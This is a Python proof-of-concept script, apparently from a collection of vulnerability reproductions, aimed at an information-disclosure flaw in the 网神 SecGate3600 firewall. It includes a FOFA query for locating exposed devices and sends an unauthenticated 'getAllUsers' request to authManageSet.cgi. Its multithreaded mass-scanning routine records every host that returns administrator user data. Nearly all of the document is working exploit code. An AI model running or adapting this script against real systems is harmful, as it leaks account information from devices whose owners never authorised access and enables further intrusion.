#网神SecGate3600_authManageSet.cgi信息泄露漏洞复现
#fofa:body="sec_gate_image/login_02.gif!"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
███████╗███████╗ ██████╗ ██████╗  █████╗ ████████╗███████╗        ██████╗  ██████╗  ██████╗  ██████╗ 
██╔════╝██╔════╝██╔════╝██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝        ╚════██╗██╔════╝ ██╔═████╗██╔═████╗
███████╗█████╗  ██║     ██║  ███╗███████║   ██║   █████╗           █████╔╝███████╗ ██║██╔██║██║██╔██║
╚════██║██╔══╝  ██║     ██║   ██║██╔══██║   ██║   ██╔══╝           ╚═══██╗██╔═══██╗████╔╝██║████╔╝██║
███████║███████╗╚██████╗╚██████╔╝██║  ██║   ██║   ███████╗███████╗██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝
╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝                                                                                                                                                                                   
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="网神SecGate3600_authManageSet.cgi信息泄露漏洞复现")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/cgi-bin/authUser/authManageSet.cgi"
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/108.0.0.0Safari/537.36',
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate',
        'Connection':'close',
    }
    data = "type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc"
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,proxies=proxies)
        if res1.status_code==200 and '管理员' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()